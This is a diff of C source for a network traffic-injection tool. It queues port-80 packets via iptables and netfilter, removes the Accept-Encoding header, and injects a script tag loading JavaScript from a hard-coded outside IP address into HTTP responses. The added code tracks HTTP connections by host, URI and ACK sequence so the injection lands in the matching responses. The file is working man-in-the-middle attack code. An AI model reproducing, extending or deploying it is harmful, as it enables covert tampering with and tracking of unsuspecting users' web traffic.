@@ -3,6 +3,9 @@
 //#define JS "hello world"
 #define JS "<script type=\"text/javascript\" src=\"http://210.22.155.236/js/wa.init.min.js?v=20150930\" id=\"15_bri_mjq_init_min_36_wa_101\" async  data=\"userId=12245789-423sdfdsf-ghfg-wererjju8werw&channel=test&phoneModel=DOOV S1\"></script>"
 #define JS_LEN strlen(JS)
+#define TIMEOUT_HTTP 24*60*60
+
+struct list_head httpc_list;
 
 unsigned short in_cksum(unsigned short *addr, int len)    /* function is from ping.c */
 {
@@ -65,6 +68,104 @@ unsigned short tcp_chsum(struct iphdr *iph , struct tcphdr *tcp ,int tcp_len)
 	
 }
 
+///////////////////////////////////////////////////////////////////////
+
+void timeout(void* arg)
+{
+	struct http_conntrack *httpc_cursor , *httpc_tmp;
+	
+	long current_sec;
+	
+	while(1)
+	{
+		
+		sleep(TIMEOUT_HTTP);
+		current_sec=get_current_sec();
+
+		list_for_each_entry_safe(httpc_cursor, httpc_tmp, &httpc_list, list)
+		{		
+			if(current_sec - httpc_cursor->last_time > TIMEOUT_HTTP)
+			{
+				debug_log("httpc timeout");
+				thread_lock();
+				la_list_del(&httpc_cursor->list);
+				free_page(httpc_cursor);
+				httpc_cursor=NULL;
+				thread_unlock();
+				continue;
+			}
+			
+		}	
+	}
+}
+///////////////////////////////////////////////////////////////////////
+
+struct http_conntrack* find_http_conntrack_by_host(struct _skb *skb)
+{
+	struct http_conntrack *cursor , *tmp;
+	list_for_each_entry_safe(cursor, tmp, &httpc_list, list)
+	{
+		if(!strcmp(skb->hhdr.host , cursor->host) ||
+			(skb->iph->saddr == cursor->sip &&
+			skb->iph->daddr == cursor->dip))
+		{
+			return cursor;
+		}
+	}	
+	return NULL;
+}
+
+struct http_conntrack* find_http_conntrack_by_ack(struct _skb *skb)
+{
+	struct http_conntrack *cursor , *tmp;
+	
+	list_for_each_entry_safe(cursor, tmp, &(httpc_list), list)
+	{		
+		if((skb->iph->saddr == cursor->dip &&
+			skb->iph->daddr == cursor->sip) &&
+			ntohl(skb->tcp->ack_seq) == ntohl(cursor->seq)+cursor->http_len)
+		{
+			return cursor;
+		}
+	}	
+	return NULL;
+}
+
+struct http_conntrack* init_httpc(struct _skb *skb)
+{
+	struct http_conntrack *httpc;
+	httpc=(struct http_conntrack*)new_page(sizeof(struct  http_conntrack));
+	if(!httpc)
+	{
+		return NULL;
+	}
+	thread_lock();	
+	httpc->last_time = get_current_sec();
+	httpc->sip = skb->iph->saddr;
+	httpc->dip = skb->iph->daddr;
+	httpc->seq = skb->tcp->seq;
+	httpc->ack_seq = skb->tcp->ack_seq;
+	httpc->http_len = skb->http_len;
+	strncpy(httpc->host , skb->hhdr.host ,COMM_MAX_LEN);
+	strncpy(httpc->uri , skb->hhdr.uri ,COMM_MAX_LEN);
+	la_list_add_tail(&(httpc->list), &(httpc_list));
+	thread_unlock();
+	return httpc;
+}
+
+int update_httpc(struct http_conntrack *httpc,
+	struct _skb *skb)
+{
+	thread_lock();
+	httpc->last_time = get_current_sec();
+	httpc->seq = skb->tcp->seq;
+	httpc->ack_seq = skb->tcp->ack_seq;
+	httpc->http_len = skb->http_len;
+	thread_unlock();
+	return 0;
+}
+
+///////////////////////////////////////////////////////////////
 
 int insert_code(struct _skb *skb)
 {
@@ -127,6 +228,7 @@ int change_accept_encoding(struct _skb *skb)
 
 int dispath(struct _skb* skb)
 {
+	struct http_conntrack* httpc;
 	if(skb->http_len <=1 || !skb->http_head )
 	{
 		return -1;
@@ -136,10 +238,21 @@ int dispath(struct _skb* skb)
 	{
 		case HTTP_TYPE_REQUEST_GET:
 		{
-			if(0==strcmp(skb->hhdr.uri , "/"))
+			httpc=find_http_conntrack_by_host(skb);
+			if(!httpc)
 			{
-				change_accept_encoding(skb);	
-				return 0;
+				httpc=init_httpc(skb);
+				if(!httpc)
+				{
+					return -1;
+				}
+				
+				return change_accept_encoding(skb);
+			}
+			if(!strcmp(skb->hhdr.uri , httpc->uri))
+			{
+				update_httpc(httpc , skb);
+				return change_accept_encoding(skb);
 			}
 			return -1;
 		}
@@ -151,9 +264,14 @@ int dispath(struct _skb* skb)
 		case HTTP_TYPE_OTHER:
 		default:
 		{
+			httpc=find_http_conntrack_by_ack(skb);
+			if(!httpc)
+			{
+				return -1;
+			}
 			insert_code(skb);
 			return 0;			
-		}			
+		}
 	}
 	return 0;
 }
@@ -471,10 +589,11 @@ int nfq()
 int main(int argc, const char *argv[])
 {
     
-
+	INIT_LIST_HEAD(&httpc_list);
 	init_mpool(1*1024*1024);//256M
 	init_queue();
-	init_thpool(1);
+	init_thpool(2);
+	thpool_add_job(timeout , NULL);
 
 	system("iptables -D INPUT -p tcp --sport 80 -j QUEUE");
 	system("iptables -D OUTPUT -p tcp --dport 80 -j QUEUE");
